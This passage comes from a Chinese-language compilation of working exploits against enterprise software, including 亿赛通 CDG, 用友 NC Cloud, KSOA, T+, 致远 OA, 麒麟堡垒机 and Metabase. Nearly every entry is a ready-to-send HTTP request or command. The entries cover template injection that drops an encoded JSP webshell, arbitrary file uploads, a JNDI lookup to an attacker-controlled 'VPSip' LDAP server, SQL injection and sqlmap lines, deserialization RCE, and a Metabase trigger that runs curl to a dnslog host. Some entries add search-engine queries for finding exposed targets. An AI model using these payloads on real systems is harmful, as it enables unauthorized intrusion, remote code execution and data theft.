        "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo PCUhCiAgICBjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXIgewogICAgICAgIFUoQ2xhc3NMb2FkZXIgYykgewogICAgICAgICAgICBzdXBlcihjKTsKICAgICAgICB9CiAgICAgICAgcHVibGljIENsYXNzIGcoYnl0ZVtdIGIpIHsKICAgICAgICAgICAgcmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsIDAsIGIubGVuZ3RoKTsKICAgICAgICB9CiAgICB9CiAKICAgIHB1YmxpYyBieXRlW10gYmFzZTY0RGVjb2RlKFN0cmluZyBzdHIpIHRocm93cyBFeGNlcHRpb24gewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RGVjb2RlciIpOwogICAgICAgICAgICByZXR1cm4gKGJ5dGVbXSkgY2xhenouZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBTdHJpbmcuY2xhc3MpLmludm9rZShjbGF6ei5uZXdJbnN0YW5jZSgpLCBzdHIpOwogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkJhc2U2NCIpOwogICAgICAgICAgICBPYmplY3QgZGVjb2RlciA9IGNsYXp6LmdldE1ldGhvZCgiZ2V0RGVjb2RlciIpLmludm9rZShudWxsKTsKICAgICAgICAgICAgcmV0dXJuIChieXRlW10pIGRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZSIsIFN0cmluZy5jbGFzcykuaW52b2tlKGRlY29kZXIsIHN0cik7CiAgICAgICAgfQogICAgfQolPgo8JQogICAgU3RyaW5nIGNscyA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwYXNzd2QiKTsKICAgIGlmIChjbHMgIT0gbnVsbCkgewogICAgICAgIG5ldyBVKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5nKGJhc2U2NERlY29kZShjbHMpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7CiAgICB9CiU+ >./webapps/ROOT/1.txt\")}"
}
```

文件转换为jsp

```
POST /service_transport/service.action HTTP/1.1
Host: your-ip
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
 
{
        "command": "GetFZinfo", 
        "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c certutil -decode ./webapps/ROOT/1.txt ./webapps/ROOT/1.jsp\")}"
}
```

## 87.亿赛通 /UploadFileFromClientServiceForClient 任意文件上传漏洞

介绍

亿某通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业校心重要数据资产,对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。

近日监测发现某通电子文档安全管理系统任意文件上传漏洞，攻击者可通过发送特制请求来利用此漏洞，成功利用此漏洞可在目标系统上执行任意代码。

对此，建议广大用户做好资产自查以及预防工作，以免遭受黑容攻击。

影响范围

其他未确认版本需自查

exp

直接bp发包即可，shell访问地址：https://x.x.x.x/tttT.jsp

```
POST /CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: */*
Content-Length: 1

shell内容

```
##  88.亿赛通电子文档安全管理系统远程命令执行漏洞

来源Matrix SEC

**0x01 影响版本**

亿赛通电子文档安全管理系统

**0x02 网络测绘**

fofa:

```
app="亿赛通-电子文档安全管理系统"
```

hunter: 

```
web.title="电子文档安全管理系统"
```
```
POST /solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22whoami%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.1383.67 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 
Content-Length: 78

<?xml version="1.0" encoding="UTF-8"?>
    <RDF>
        <item/>
    </RDF>

```

 ##  89.用友 NC Cloud jsinvoke 任意文件上传漏洞

漏洞描述

用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限

app="用友-NC-Cloud"

影响版本

```
NC63、NC633、NC65NC Cloud1903、NC Cloud1909NC Cloud2005、NC Cloud2105、NC Cloud2111
```

POC1

```
POST /uapjs/jsinvoke/?action=invoke
Content-Type: application/json

{
  "serviceName": "nc.itf.iufo.IBaseSPService",
  "methodName": "saveXStreamConfig",
  "parameterTypes": [
    "java.lang.Object",
    "java.lang.String"
  ],
  "parameters": [
    "${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
    "webapps/nc_web/407.jsp"
  ]
}
```

POC2

```
POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host:
Connection: Keep-Alive
Content-Length: 253
Content-Type: application/x-www-form-urlencoded

{
  "serviceName": "nc.itf.iufo.IBaseSPService",
  "methodName": "saveXStreamConfig",
  "parameterTypes": [
    "java.lang.Object",
    "java.lang.String"
  ],
  "parameters": [
    "${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/TomcatBypass/TomcatEcho')}",
    "webapps/nc_web/301.jsp"
  ]
}
```

POC3

```
POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: 192.168.0.11:8089
Content-Length: 249
Accept: */*

{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/1ndex.jsp"]}
```

访问1ndex.jsp，命令执行成功！

 ```
 https://192.168.0.11:8089/1ndex.jsp?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream())
 ```



```
GET /1ndex.jsp?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream()) HTTP/1.1
Host: 192.168.0.11:8089
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
##  90.用友GRP-U8存在信息泄露

漏洞描述：用友U8系统存可直接访问log日志，泄露敏感信息

批量扫描工具:https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/%E7%94%A8%E5%8F%8BGRP-U8

GET /logs/info.log HTTP/1.1


## 91.用友畅捷通 T注入

sqlmap -u http://xx.xx.xx.xx/WebSer~1/create_site.php?site_id=1 --is-dba

## 92.用友时空 KSOA servletimagefield 文件 sKeyvalue 参数SQL 注入
```
GET
/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))-
-+ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,
like Gecko) 5bGx5rW35LmL5YWz
Accept-Encoding: gzip, deflate
Connection:
```
## 93.用友时空 KSOATaskRequestServlet sql注入漏洞

```
/servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1*&password=1,
```
## 94.用友时空KSOA PayBill SQL注入漏洞

```
POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 134
Accept-Encoding: gzip, deflate
Connection: close

<?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY '00:00:03';-</name><name>1</name><name>102360</name></root>
```

## 95.用友文件服务器认证绕过

资产搜索：

app="用友-NC-Cloud"   或者是app="用友-NC-Cloud" && server=="Apache-Coyote/1.1"

POST数据包修改返回包 false改成ture就可以绕过登陆

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Date: Thu, 10 Aug 2023 20:38:25 GMT
Connection: close
Content-Length: 17

{"login":"false"}
```

## 96.用友移动管理系统 uploadApk.d
```
POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1 
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO 3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,im age/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 
Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server 
Connection: close ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3 
Content-Disposition:form-data;name="downloadpath"; filename="a.jsp" 
Content-Type: application/msword

hello 
------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
```
## 97.用有畅捷通T+GetStoreWarehouseByStore RCE漏洞

```
POST
/tplus/ajaxpro/Ufida.T.CodeBehind.PriorityLevel,App Code.ashx?met hod=GetstoreWarehouseByStore HTTP/1.1 Host: 
User-Agent:Mozilla/5.0 (X11;Linuxx86 64)AppleWebKit/537.36(KHTML， like
Gecko)Chrome/34.0.1847.137 Safari 4E423F 
Connection: close
Content-Length:668 
X-Ajaxpro-Method:GetstoreWarehouseByStore 
Accept-Encoding:gzip 



{ "storeID":{
"type":"system.Windows.Data.objectDataProvider,
PresentationFramework,Version=4.0.0.0,Culture=neutral,
PublicKeyToken=31bf3856ad364e35",   
"MethodName":"start"        
"objectInstance":{        
" type":"system.Diagnostics.Process,        
System,Version=4.0.0.0,
Culture=neutral,
PublicKeyToken=b77a5c561934e089"        
"startInfo":{        
" type":"system.Diagnostics.ProcessstartInfo, system,
Version=4.0.0.0,Culture=neutral,
PublicKeyToken=b77a5c561934e089"        
"FileName":"cmd",        
"Arguments":"/cwhoami>
C:/Progra~2/Chanjet/TPlusStd/Website/2RUsL6jgx9sGX4GItBcVfxarBM.t
xt"        }        } } }
```
## 98.用友nc-cloudRCE

漏洞影响

NC63、NC633、NC65

NC Cloud1903、NC Cloud1909

NC Cloud2005、NC Cloud2105、NC Cloud2111

YonBIP高级版2207


先发送数据包，返回200

```
POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: 127.0.0.1:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cookiets=168170496; JSESSIONID=33A343770FF.server
If-None-Match: W/"1571-1589211696000"
If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 249

{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/404.jsp"]}
```

再发送数据包执行命令，返回命令执行结果

```
POST /404.jsp?error=bsh.Interpreter HTTP/1.1
Host: 127.0.0.1:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cookiets=1681785232226; JSESSIONID=334D3ED07A343770FF.server
If-None-Match: W/"1571-1589211696000"
If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 104

cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ping 8.8.8.8").getInputStream())
```

## 99.远秋医学技能考试系统SQL注入

```
sqlmap -u "http://xxx.xxx.xxx.xxx/NewsDetailPage.aspx?key=news&id=7" -p id -batch
```
## 100.致远oa rce

```
1、/seeyon/ajax.do?method=ajaxAction&managerName=syncConfi
gManager
2、/seeyon/ajax.do?method=ajaxAction&managerName=syncConfi
gManager&requestCompress=gzip
3、/seeyon/ajax.do?method=ajaxAction&managerName=syncConfi
gManager&requestCompress=gzip&managerMethod=checkDB&argumen
ts=
4、/seeyon/ajax.do?method=ajaxAction&managerName=syncConfi
gManager&managerMethod=checkDB&arguments=
5、/seeyon/ajax.do?method=ajaxAction&managerName=syncConfi
gManager&managerMethod=&arguments
```

## 101.致远oa 任意文件上传

```
POST 
/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/de.jsp&fileId=2
 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: */*
Referer: 
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=5C25EFEF65A2B6A4C12848B88EA60639; loginPageURL=
Content-Type: multipart/form-data; 
boundary=59229605f98b8cf290a7b8908b34616b
Accept-Encoding: gzip
Connection: close
Content-Length: 208

--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name="upload"; filename="123.xls"
Content-Type: application/vnd.ms-excel

<% out.println("xxxx");%>
--59229605f98b8cf290a7b8908b34616b--
```
## 102.致远OA_V8.1SP2文件上传漏洞

```
POST 
/seeyon/ajax.do?method=ajaxAction&managerName=formulaManager&managerMethod=saveFormula4C1loud 
 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: */*
Referer: 
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=5C25EFEF65A2B6A4C12848B88EA60639; loginPageURL=
Content-Type: multipart/form-data; 
boundary=59229605f98b8cf290a7b8908b34616b
Accept-Encoding: gzip
Connection: close
Content-Length: 208

arguments={"formulaName":"test","formulaAlias":"safe_pre","formulaType":"2","formulaExpression":"","sample":"木马"}
```

## 103.致远OA任意管理员登录

```
POST /seeyon/thirdpartyController.do HTTP/1.1

method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
```
## 104.中远麒麟堡垒机SQL注入

麒麟堡垒机用于运维管理的认证、授权、审计等监控管理。中远麒麟堡垒机存在SQL注入，可利用该漏洞获取系统敏感信息。

**检索条件:**

cert="Baolei"||title="麒麟堡垒机"||body="admin.php?controller=admin_index&action=get_user_login_fristauth"||body="admin.php?controller=admin_index&action=login"


```
 relative: req0 && req1
  session: false
  requests:
  - method: POST
    timeout: 10
    path: /admin.php?controller=admin_commonuser
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
        like Gecko) Chrome/69.0.2786.81 Safari/537.36
    data: username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm
    follow_redirects: true
    matches: (code.eq("200") && time.gt("5") && time.lt("10"))
  - method: POST
    timeout: 10
    path: /admin.php?controller=admin_commonuser
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
        like Gecko) Chrome/69.0.2786.81 Safari/537.36
      Content-Type: application/x-www-form-urlencoded
    data: username=admin
    follow_redirects: true
    matches: time.lt("5")
```
## 105.中远麒麟堡垒机tokens SQL

```
POST /baoleiji/api/tokens HTTP/1.1


constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm' = 'AAdm'&title=%40127.0.0.1 
```

## 106.Metabase远程代码执行漏洞

CVE-2023-38646漏洞是一种高危的Metabase远程代码执行漏洞。Metabase是一个开源的数据分析和可视化工具，可以帮助用户连接到各种数据源，并进行数据查询、分析和可视化。

工具链接

`https://github.com/robotmikhro/CVE-2023-38646`


**漏洞描述**

Metabase是一个开源的数据分析和可视化工具，它可以帮助用户轻松连接到各种数据源，包括数据库、云服务和API，然后使用绘图的界面进行数据查询、分析和可视化。需身份认证的远程攻击者利用该漏洞可以在服务器上以运行元数据库服务器的权限执行任意命令

**漏洞影响**

元数据库  

**网络测绘**

应用程序=“元数据库”  

POC

/api/session/properties

```
POST /api/setup/validate HTTP/1.1
Host: 
Content-Type: application/json
Content-Length: 812

{
    "token": "e56e2c0f-71bf-4e15-9879-d964f319be69",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl ecw14d.dnslog.cn')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```
